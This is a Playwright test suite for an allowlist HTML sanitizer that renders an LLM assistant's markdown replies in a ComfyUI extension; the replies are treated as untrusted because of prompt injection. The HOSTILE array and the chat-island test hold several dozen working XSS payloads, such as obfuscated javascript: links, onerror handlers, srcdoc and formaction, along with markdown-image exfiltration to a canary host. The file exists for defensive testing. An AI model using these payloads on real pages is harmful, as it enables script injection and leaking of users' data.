/**
 * Rendered LLM markdown sanitizer (allowlist).
 *
 * The assistant reply is untrusted (prompt-injectable through error text or workflow content) and is
 * rendered with innerHTML inside the ComfyUI origin. These specs exercise `sanitizeHtml` in a real DOM:
 * the sanitized markup must contain only allowlisted elements and attributes, every URL must resolve to
 * a safe scheme when parsed (not when pattern-matched), and activating the surviving elements must not
 * run script, open a dialog or reach the canary host. A golden corpus pins that normal replies keep
 * their structure, and one case drives the real chat island end to end.
 */

import { test, expect } from '@playwright/test';
import { waitForDoctorReady, clearStorage } from '../utils/helpers.js';

const CANARY_HOST = 'canary.invalid';
const LONG_PATH = 'a'.repeat(200000);

// Each payload tries to run script (window.__xss), navigate, submit or load from the canary host.
const HOSTILE = [
  ['tab-split javascript scheme', '<a href="java&#9;script:window.__xss=1">x</a>'],
  ['newline-split javascript scheme', '<a href="java&#10;script:window.__xss=1">x</a>'],
  ['carriage-return-split javascript scheme', '<a href="java&#13;script:window.__xss=1">x</a>'],
  ['leading whitespace javascript scheme', '<a href="   javascript:window.__xss=1">x</a>'],
  ['leading control char javascript scheme', '<a href="&#1;javascript:window.__xss=1">x</a>'],
  ['entity-encoded colon', '<a href="javascript&colon;window.__xss=1">x</a>'],
  ['entity-encoded first letter', '<a href="&#106;avascript:window.__xss=1">x</a>'],
  ['mixed-case scheme', '<a href="JaVaScRiPt:window.__xss=1">x</a>'],
  ['NUL inside scheme', '<a href="java&#0;script:window.__xss=1">x</a>'],
  ['data html link', '<a href="data:text/html,<script>window.__xss=1</script>">x</a>'],
  ['vbscript link', '<a href="vbscript:msgbox(1)">x</a>'],
  ['form action', '<form action="javascript:window.__xss=1"><input type="submit" id="s32-submit"></form>'],
  ['button formaction', '<form><button formaction="javascript:window.__xss=1">go</button></form>'],
  ['input formaction', '<form><input type="submit" formaction="javascript:window.__xss=1"></form>'],
  ['base element', `<base href="//${CANARY_HOST}/"><a href="#x">x</a>`],
  ['svg xlink link', '<svg><a xlink:href="javascript:window.__xss=1"><text>x</text></a></svg>'],
  ['math href', '<math><mi href="javascript:window.__xss=1">x</mi></math>'],
  ['iframe srcdoc', '<iframe srcdoc="<script>parent.__xss=1</script>"></iframe>'],
  ['iframe src', `<iframe src="//${CANARY_HOST}/frame"></iframe>`],
  ['img onerror', '<img src="x" onerror="window.__xss=1">'],
  ['style import', `<style>@import url(//${CANARY_HOST}/x.css)</style><p>t</p>`],
  ['style attribute url', `<p style="background:url(//${CANARY_HOST}/x)">t</p>`],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=javascript:window.__xss=1">'],
  ['link stylesheet', `<link rel="stylesheet" href="//${CANARY_HOST}/x.css">`],
  ['noscript mutation shape', '<noscript><p title="</noscript><img src=x onerror=window.__xss=1>"></noscript>'],
  ['template content', '<template><img src="x" onerror="window.__xss=1"></template>'],
  ['nested script tags', '<scr<script>ipt>window.__xss=1</scr</script>ipt>'],
  ['object and embed', '<object data="javascript:window.__xss=1"></object><embed src="javascript:window.__xss=1">'],
  ['area link', '<map name="m"><area href="javascript:window.__xss=1" shape="default"></map>'],
  ['details ontoggle', '<details open ontoggle="window.__xss=1">x</details>'],
  ['video poster and source', `<video poster="//${CANARY_HOST}/p"><source src="//${CANARY_HOST}/v"></video>`],
  ['relative link', '<a href="/api/delete_everything">x</a>'],
  ['safe link with event handler', '<a href="https://example.com/ok" onclick="window.__xss=1">x</a>'],
  ['safe link with padding and embedded tab/newline', '<a href="  https://exa&#9;mple.com/a&#10;b  ">x</a>'],
  ['oversized url', `<a href="https://example.com/${LONG_PATH}">x</a>`],
];

// S35: `img` is not allowed output; a remote image would load at assignment time (a data channel).
const ALLOWED_TAGS = new Set([
  'a', 'b', 'blockquote', 'br', 'code', 'del', 'em', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'hr', 'i', 'input',
  'li', 'ol', 'p', 'pre', 's', 'span', 'strong', 'table', 'tbody', 'td', 'th', 'thead', 'tr', 'u', 'ul',
]);

const GOLDEN = [
  ['paragraph and emphasis', 'Plain **bold** and *italic* with `inline code`.'],
  ['heading levels', '# One\n\n## Two\n\n### Three'],
  ['fenced code with language', '```python\nprint("hi")\n```'],
  ['fenced code without language', '```\nplain block\n```'],
  ['unordered nested list', '- a\n  - b\n    - c\n- d'],
  ['ordered list with start', '3. three\n4. four'],
  ['table with alignment', '| a | b |\n|:-:|--:|\n| 1 | 2 |'],
  ['blockquote', '> quoted line\n> second line'],
  ['https link with title', '[docs](https://example.com/docs "Docs")'],
  ['mailto link', '[mail](mailto:someone@example.com)'],
  ['task list', '- [x] done\n- [ ] todo'],
];

async function openHarness(page, { routeChat } = {}) {
  await page.route('**/scripts/app.js', (route) => route.fulfill({
    status: 200, contentType: 'application/javascript', body: 'export const app = window.app;',
  }));
  await page.route('**/scripts/api.js', (route) => route.fulfill({
    status: 200, contentType: 'application/javascript', body: 'export const api = window.api;',
  }));
  for (const [pattern, body] of [
    ['**/doctor/provider_defaults', {}],
    ['**/debugger/set_language', { success: true }],
    ['**/debugger/last_analysis', {}],
    ['**/doctor/list_models', { success: true, models: [] }],
  ]) {
    await page.route(pattern, (route) => route.fulfill({
      status: 200, contentType: 'application/json', body: JSON.stringify(body),
    }));
  }
  if (routeChat) await page.route('**/doctor/chat', routeChat);
  await page.goto('test-harness.html');
  await clearStorage(page);
  await waitForDoctorReady(page);
  await page.waitForFunction(() => Boolean(window.marked), null, { timeout: 15000 });
}

function watchCanary(page) {
  const seen = { dialogs: [], requests: [] };
  page.on('dialog', (dialog) => { seen.dialogs.push(dialog.message()); dialog.dismiss().catch(() => {}); });
  page.on('request', (request) => { if (request.url().includes(CANARY_HOST)) seen.requests.push(request.url()); });
  return seen;
}

async function blockCanaryHost(page) {
  await page.route(`**://${CANARY_HOST}/**`, (route) => route.abort());
  await page.route(`**://${CANARY_HOST}**`, (route) => route.abort());
}

// Runs inside the page: sanitize, inspect the real DOM the string produces, mount it, activate it.
async function sanitizeInPage(page, html) {
  return page.evaluate(async ({ html: input, allowedTags }) => {
    const { sanitizeHtml } = await import('/web/doctor_rendering.js');
    window.__xss = 0;
    const started = performance.now();
    const output = sanitizeHtml(input);
    const elapsedMs = performance.now() - started;

    const probe = document.createElement('div');
    probe.innerHTML = output;
    const allowed = new Set(allowedTags);
    const violations = [];
    const urlProblems = [];
    for (const el of probe.querySelectorAll('*')) {
      const tag = el.localName;
      if (el.namespaceURI !== 'http://www.w3.org/1999/xhtml' || !allowed.has(tag)) {
        violations.push(`element <${el.namespaceURI === 'http://www.w3.org/1999/xhtml' ? tag : `${el.namespaceURI}:${tag}`}>`);
      }
      for (const attr of el.attributes) {
        const name = attr.name;
        if (name.startsWith('on') || ['style', 'srcdoc', 'action', 'formaction', 'xlink:href', 'ping', 'background'].includes(name)) {
          violations.push(`attribute ${tag}[${name}]`);
        }
        if (name === 'href' || name === 'src') {
          let protocol = '';
          try { protocol = new URL(attr.value).protocol; } catch (error) { protocol = attr.value.startsWith('#') ? '#' : 'relative'; }
          const ok = tag === 'a' ? ['http:', 'https:', 'mailto:', '#'].includes(protocol) : ['http:', 'https:'].includes(protocol);
          if (!ok) urlProblems.push(`${tag}[${name}] -> ${protocol}`);
          if (attr.value.length > 2048) urlProblems.push(`${tag}[${name}] length ${attr.value.length}`);
          if (/[\u0000-\u001f\u007f\s]/.test(attr.value)) urlProblems.push(`${tag}[${name}] has whitespace/control`);
        }
      }
      if (tag === 'input' && !(el.getAttribute('type') === 'checkbox' && el.hasAttribute('disabled'))) {
        violations.push('input that is not a disabled checkbox');
      }
    }

    // Activate every surviving element the way a user (or the keyboard) would, in the live document.
    const mount = document.createElement('div');
    mount.id = '__s32_mount';
    mount.innerHTML = output;
    document.body.appendChild(mount);
    const forms = mount.querySelectorAll('form').length;
    for (const el of mount.querySelectorAll('a[href], area[href], button, input')) {
      let scheme = '';
      if (el.hasAttribute('href')) {
        try { scheme = new URL(el.getAttribute('href'), document.baseURI).protocol; } catch (error) { scheme = 'invalid:'; }
      }
      // Navigating to http(s)/mailto is the intended behaviour of a kept link; only activate the rest.
      if (['http:', 'https:', 'mailto:'].includes(scheme) || el.getAttribute('href')?.startsWith('#')) continue;
      el.click();
    }
    await new Promise((resolve) => setTimeout(resolve, 150));
    const canary = window.__xss;
    mount.remove();
    return { output: output.length > 600 ? `${output.slice(0, 600)}...` : output, outputLength: output.length, violations, urlProblems, forms, canary, elapsedMs };
  }, { html, allowedTags: [...ALLOWED_TAGS] });
}

test.describe('Rendered markdown sanitizer', () => {
  test('hostile corpus is neutralized in a real DOM', async ({ page }) => {
    const seen = watchCanary(page);
    await blockCanaryHost(page);
    await openHarness(page);

    const failures = [];
    for (const [name, html] of HOSTILE) {
      const result = await sanitizeInPage(page, html);
      const problems = [
        ...result.violations,
        ...result.urlProblems,
        ...(result.canary ? [`canary set (${result.canary})`] : []),
        ...(result.forms ? [`${result.forms} form element(s) survive`] : []),
        ...(result.elapsedMs > 1500 ? [`slow: ${Math.round(result.elapsedMs)} ms`] : []),
      ];
      if (problems.length) failures.push(`${name}: ${problems.join('; ')} => ${result.output}`);
    }
    expect.soft(failures, failures.join('\n')).toEqual([]);
    expect.soft(seen.dialogs, 'no dialog may open').toEqual([]);
    expect.soft(seen.requests, `no request may reach ${CANARY_HOST}`).toEqual([]);
  });

  test('safe links keep their href and gain rel and target', async ({ page }) => {
    await openHarness(page);
    const result = await page.evaluate(async () => {
      const { sanitizeHtml } = await import('/web/doctor_rendering.js');
      const probe = document.createElement('div');
      probe.innerHTML = sanitizeHtml('<a href="https://example.com/ok?q=1#frag" onclick="x()">ok</a><a href="mailto:a@example.com">m</a><a href="#section-1">s</a><a href="  https://exa&#9;mple.com/a&#10;b  ">c</a>');
      return [...probe.querySelectorAll('a')].map((a) => ({
        href: a.getAttribute('href'), rel: a.getAttribute('rel'), target: a.getAttribute('target'), onclick: a.hasAttribute('onclick'),
      }));
    });
    expect(result).toHaveLength(4);
    expect(result[0]).toMatchObject({ href: 'https://example.com/ok?q=1#frag', rel: 'noopener noreferrer', target: '_blank', onclick: false });
    expect(result[1].href).toBe('mailto:a@example.com');
    expect(result[2].href).toBe('#section-1');
    // The canonical parsed form is written back, so the browser cannot read the value differently.
    expect(result[3].href).toBe('https://example.com/ab');
  });

  // S35: a remote <img> starts a request when the sanitized string is assigned, so any text the model was
  // given (error text, workflow content) can leave in the query string with no click. Images therefore
  // never survive; each becomes a plain link (or its alt text), and nothing is requested without a click.
  test('images never load: they become plain links or text', async ({ page }) => {
    const seen = watchCanary(page);
    await blockCanaryHost(page);
    await openHarness(page);
    const origin = await page.evaluate(() => location.origin);
    const longAddress = `https://example.com/${'a'.repeat(500)}.png`;
    const cases = {
      markdownImage: { markdown: '![alt text](https://canary.invalid/p.gif?d=secret "tip")' },
      noAlt: { html: '<img src="https://canary.invalid/x.png">' },
      sameOrigin: { html: `<img src="${origin}/view?filename=s35-canary.png" alt="local">` },
      linkedImage: { html: '<a href="https://example.com/page"><img src="https://canary.invalid/i.png" alt="logo"></a>' },
      linkedImageNoAlt: { html: '<a href="https://example.com/page"><img src="https://canary.invalid/i.png"></a>' },
      unusableAddress: { html: '<img src="data:image/png;base64,AAAA" alt="inline">' },
      relativeAddress: { html: '<img src="/x.png" alt="rel">' },
      credentialAddress: { html: '<img src="https://user:pw@canary.invalid/x.png" alt="cred">' },  // pragma: allowlist secret
      longAddress: { html: `<img src="${longAddress}">` },
      paddedAddress: { html: '<img src="  https://exa&#9;mple.com/a.png  " alt="p">' },
    };
    const results = await page.evaluate(async (inputs) => {
      const { sanitizeHtml } = await import('/web/doctor_rendering.js');
      const out = {};
      for (const [name, input] of Object.entries(inputs)) {
        const source = input.markdown !== undefined ? window.marked.parse(input.markdown) : input.html;
        const mount = document.createElement('div');
        mount.innerHTML = sanitizeHtml(source);
        document.body.appendChild(mount);
        out[name] = {
          images: mount.querySelectorAll('img').length,
          nestedAnchors: mount.querySelectorAll('a a').length,
          anchors: [...mount.querySelectorAll('a')].map((a) => ({
            href: a.getAttribute('href'), text: a.textContent, rel: a.getAttribute('rel'), target: a.getAttribute('target'), title: a.getAttribute('title'),
          })),
          text: mount.textContent,
        };
        mount.remove();
      }
      await new Promise((resolve) => setTimeout(resolve, 300));
      return out;
    }, cases);

    for (const [name, result] of Object.entries(results)) {
      expect.soft(result.images, `${name}: no img element`).toBe(0);
      expect.soft(result.nestedAnchors, `${name}: no nested anchor`).toBe(0);
    }
    expect.soft(results.markdownImage.anchors).toEqual([
      { href: 'https://canary.invalid/p.gif?d=secret', text: 'alt text', rel: 'noopener noreferrer', target: '_blank', title: 'tip' },
    ]);
    expect.soft(results.noAlt.anchors.map((a) => [a.href, a.text])).toEqual([['https://canary.invalid/x.png', 'https://canary.invalid/x.png']]);
    expect.soft(results.sameOrigin.anchors.map((a) => a.text)).toEqual(['local']);
    expect.soft(results.linkedImage.anchors.map((a) => [a.href, a.text])).toEqual([['https://example.com/page', 'logo']]);
    expect.soft(results.linkedImageNoAlt.anchors).toHaveLength(1);
    expect.soft(results.unusableAddress.anchors).toEqual([]);
    expect.soft(results.unusableAddress.text).toBe('inline');
    expect.soft(results.relativeAddress.anchors).toEqual([]);
    expect.soft(results.relativeAddress.text).toBe('rel');
    expect.soft(results.credentialAddress.anchors).toEqual([]);
    expect.soft(results.credentialAddress.text).toBe('cred');
    expect.soft(results.longAddress.anchors).toHaveLength(1);
    expect.soft(results.longAddress.anchors[0].text.length).toBeLessThanOrEqual(201);
    expect.soft(results.longAddress.anchors[0].href).toBe(longAddress);
    // The parser's canonical address is written back, never the original string.
    expect.soft(results.paddedAddress.anchors.map((a) => [a.href, a.text])).toEqual([['https://example.com/a.png', 'p']]);
    expect.soft(seen.requests, `no request may reach ${CANARY_HOST}`).toEqual([]);
    expect.soft(seen.dialogs).toEqual([]);
  });

  test('an image address on the page origin is not requested either', async ({ page }) => {
    const originRequests = [];
    await openHarness(page);
    page.on('request', (request) => { if (request.url().includes('s35-origin-canary')) originRequests.push(request.url()); });
    await page.evaluate(async () => {
      const { sanitizeHtml } = await import('/web/doctor_rendering.js');
      const mount = document.createElement('div');
      mount.innerHTML = sanitizeHtml(`<img src="${location.origin}/view?filename=s35-origin-canary.png" alt="a">`);
      document.body.appendChild(mount);
      await new Promise((resolve) => setTimeout(resolve, 300));
    });
    expect(originRequests).toEqual([]);
  });

  test('golden corpus keeps its structure', async ({ page }) => {
    await openHarness(page);
    const rows = await page.evaluate(async (corpus) => {
      const { sanitizeHtml } = await import('/web/doctor_rendering.js');
      const signature = (html) => {
        const root = document.createElement('div');
        root.innerHTML = html;
        const parts = [];
        const walk = (node) => {
          if (node.nodeType === Node.TEXT_NODE) { if (node.textContent.trim()) parts.push(`#${node.textContent.trim()}`); return; }
          if (node.nodeType !== Node.ELEMENT_NODE) return;
          const attrs = [];
          for (const name of ['class', 'align', 'start', 'type', 'alt', 'title']) {
            if (node.hasAttribute(name)) attrs.push(`${name}=${node.getAttribute(name)}`);
          }
          for (const name of ['href', 'src']) {
            if (node.hasAttribute(name)) attrs.push(`${name}=${new URL(node.getAttribute(name), 'https://doctor.invalid/').href}`);
          }
          parts.push(`<${node.localName} ${attrs.join(' ')}>`);
          node.childNodes.forEach(walk);
          parts.push(`</${node.localName}>`);
        };
        root.childNodes.forEach(walk);
        return parts.join('|');
      };
      return corpus.map(([name, markdown]) => {
        const raw = window.marked.parse(markdown);
        return { name, before: signature(raw), after: signature(sanitizeHtml(raw)) };
      });
    }, GOLDEN);
    for (const row of rows) {
      expect.soft(row.after, row.name).toBe(row.before);
    }
  });

  test('fails closed to escaped text when parsing throws', async ({ page }) => {
    await openHarness(page);
    const output = await page.evaluate(async () => {
      const { sanitizeHtml } = await import('/web/doctor_rendering.js');
      const original = window.DOMParser;
      window.DOMParser = class { parseFromString() { throw new Error('parser unavailable'); } };
      try { return sanitizeHtml('<img src=x onerror="window.__xss=1"><b>t</b>'); } finally { window.DOMParser = original; }
    });
    expect(output).not.toContain('<img');
    expect(output).not.toContain('<b>');
    expect(output).toContain('&lt;img');
  });

  test('a hostile assistant reply cannot run script through the chat island', async ({ page }) => {
    const seen = watchCanary(page);
    await blockCanaryHost(page);
    const reply = [
      'Try this:',
      '',
      '<a id="s32-tab" href="java&#9;script:window.__xss=1">tab link</a>',
      '<a id="s32-data" href="data:text/html,<script>window.__xss=1</script>">data link</a>',
      '<form action="javascript:window.__xss=1"><button id="s32-btn">submit</button></form>',
      '<img src="x" onerror="window.__xss=1">',
      '',
      `![tracker](https://${CANARY_HOST}/p.gif?d=secret)`,
      '',
      '[safe](https://example.com/docs)',
    ].join('\n');
    await openHarness(page, {
      routeChat: (route) => route.fulfill({
        status: 200,
        contentType: 'text/event-stream',
        body: [{ delta: reply, done: false }, { done: true }].map((event) => `data: ${JSON.stringify(event)}\n\n`).join(''),
      }),
    });
    await page.evaluate(() => { window.__xss = 0; });

    const request = page.waitForRequest('**/doctor/chat');
    await page.fill('#doctor-input', 'probe');
    await page.click('#doctor-send-btn');
    await request;
    await expect(page.locator('#doctor-input')).toBeEnabled({ timeout: 10000 });
    const bubble = page.locator('#doctor-messages .doctor-chat-message').last();
    await expect(bubble).toContainText('Try this');

    for (const id of ['s32-tab', 's32-data', 's32-btn']) {
      const node = page.locator(`#${id}`);
      if (await node.count()) await node.first().click({ force: true, noWaitAfter: true }).catch(() => {});
    }
    await page.waitForTimeout(200);
    expect(await page.evaluate(() => window.__xss), 'script must not run').toBe(0);
    expect(await bubble.locator('form, iframe, script, [onerror], [onclick]').count()).toBe(0);
    await expect(bubble.locator('a[href="https://example.com/docs"]')).toHaveCount(1);
    // S35: the tracking image is a plain link, never an element that loads.
    expect(await bubble.locator('img').count()).toBe(0);
    await expect(bubble.locator(`a[href^="https://${CANARY_HOST}/p.gif"]`)).toHaveText('tracker');
    expect(seen.dialogs).toEqual([]);
    expect(seen.requests).toEqual([]);
  });
});
